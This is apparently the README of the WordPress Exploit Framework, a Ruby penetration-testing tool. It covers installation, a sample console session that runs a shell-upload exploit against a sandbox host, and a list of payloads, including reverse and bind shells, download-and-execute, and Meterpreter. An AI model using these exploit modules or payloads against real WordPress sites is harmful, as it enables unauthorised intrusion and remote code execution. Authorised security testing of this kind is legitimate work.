<p>A Ruby framework for developing and using modules which aid in the
penetration testing of WordPress powered websites and systems.</p>

<h3 id="label-What+do+I+need+to+run+it-3F">What do I need to run it?</h3>

<p>Ensure that you have Ruby &gt;= 2.4.2 installed on your system and then
install all required dependencies by opening a command prompt / terminal in
the WPXF folder and running <code>bundle install</code>.</p>

<p>If bundler is not present on your system, you can install it by running
<code>gem install bundler</code>.</p>

<h3 id="label-Troubleshooting+Installation">Troubleshooting Installation</h3>

<h4 id="label-Debian+Systems">Debian Systems</h4>

<p>If you have issues installing WPXF&#39;s dependencies (in particular,
Nokogiri), first make sure you have all the tooling necessary to compile C
extensions:</p>

<pre class="code ruby"><code class="ruby">sudo apt-get install build-essential patch</code></pre>

<p>It’s possible that you don’t have important development header files
installed on your system. Here’s what you should do if you should find
yourself in this situation:</p>

<pre class="code ruby"><code class="ruby">sudo apt-get install ruby-dev zlib1g-dev liblzma-dev</code></pre>

<h4 id="label-Windows+Systems">Windows Systems</h4>

<p>If you are experiencing errors that indicate that <code>libcurl.dll</code>
could not be loaded, you will need to ensure the latest libcurl binary is
included in your Ruby bin folder, or any other folder that is in your
environment&#39;s PATH variable.</p>

<p>The latest version can be downloaded from <a
href="http://curl.haxx.se/download.html">curl.haxx.se/download.html</a>. As
of 16/05/2016, the latest release is marked as <code>Win32 2000/XP
zip	7.40.0 libcurl SSL</code>. After downloading the archive, extract the
contents of the bin directory into your Ruby bin directory (if prompted,
don&#39;t overwrite any existing DLLs).</p>

<h3 id="label-How+do+I+use+it-3F">How do I use it?</h3>

<p>Open a command prompt / terminal in the directory that you have downloaded
WordPress Exploit Framework to, and start it by running <code>ruby
wpxf.rb</code>.</p>

<p>Once loaded, you&#39;ll be presented with the wpxf prompt, from here you
can search for modules using the <code>search</code> command or load a
module using the <code>use</code> command.</p>

<p>Loading a module into your environment will allow you to set options with
the <code>set</code> command and view information about the module using
<code>info</code>.</p>

<p>Below is an example of how one would load the symposium_shell_upload
exploit module, set the module and payload options and run the exploit
against the target.</p>

<pre class="code ruby"><code class="ruby">wpxf &gt; use exploit/symposium_shell_upload

[+] Loaded module: #&lt;Wpxf::Exploit::SymposiumShellUpload:0x3916f20&gt;

wpxf [exploit/symposium_shell_upload] &gt; set host wp-sandbox

[+] Set host =&gt; wp-sandbox

wpxf [exploit/symposium_shell_upload] &gt; set target_uri /wordpress/

[+] Set target_uri =&gt; /wordpress/

wpxf [exploit/symposium_shell_upload] &gt; set payload exec

[+] Loaded payload: #&lt;Wpxf::Payloads::Exec:0x434d078&gt;

wpxf [exploit/symposium_shell_upload] &gt; set cmd echo &quot;Hello, world!&quot;

[+] Set cmd =&gt; echo &quot;Hello, world!&quot;

wpxf [exploit/symposium_shell_upload] &gt; run

[-] Preparing payload...
[-] Uploading the payload...
[-] Executing the payload...
[+] Result: Hello, world!
[+] Execution finished successfully</code></pre>

<p>For a full list of supported commands, take a look at <a
href="https://github.com/rastating/wordpress-exploit-framework/wiki/Supported-Commands">This
Wiki Page</a>.</p>

<h3 id="label-What+is+the+difference+between+auxiliary+and+exploit+modules-3F">What is the difference between auxiliary and exploit modules?</h3>

<p>Auxiliary modules do not allow you to run payloads on the target machine,
but instead allow you to extract information from the target, escalate
privileges or provide denial of service functionality.</p>

<p>Exploit modules require you to specify a payload which subsequently gets
executed on the target machine, allowing you to run arbitrary code to
extract information from the machine, establish a remote shell or anything
else that you want to do within the context of the web server.</p>

<h3 id="label-What+payloads+are+available-3F">What payloads are available?</h3>
<ul><li>
<p><strong>bind_php:</strong> uploads a script that will bind to a specific
port and allow WPXF to establish a remote shell.</p>
</li><li>
<p><strong>custom:</strong> uploads and executes a custom PHP script.</p>
</li><li>
<p><strong>download_exec:</strong> downloads and runs a remote executable
file.</p>
</li><li>
<p><strong>meterpreter_bind_tcp:</strong> a Meterpreter bind TCP payload
generated using msfvenom.</p>
</li><li>
<p><strong>meterpreter_reverse_tcp:</strong> a Meterpreter reverse TCP payload
generated using msfvenom.</p>
</li><li>
<p><strong>exec:</strong> runs a shell command on the remote server and
returns the output to the WPXF session.</p>
</li><li>
<p><strong>reverse_tcp:</strong> uploads a script that will establish a
reverse TCP shell.</p>
</li></ul>

<p>All these payloads, with the exception of <code>custom</code> and the
Meterpreter payloads, will delete themselves after they have been executed,
to avoid leaving them lying around on the target machine after use or in
the event that they are being used to establish a shell which fails.</p>

<h3 id="label-How+can+I+write+my+own+modules+and+payloads-3F">How can I write my own modules and payloads?</h3>

<p>Guides on writing modules and payloads can be found on <a
href="https://github.com/rastating/wordpress-exploit-framework/wiki">The
Wiki</a> and full documentation of the API can be found at <a
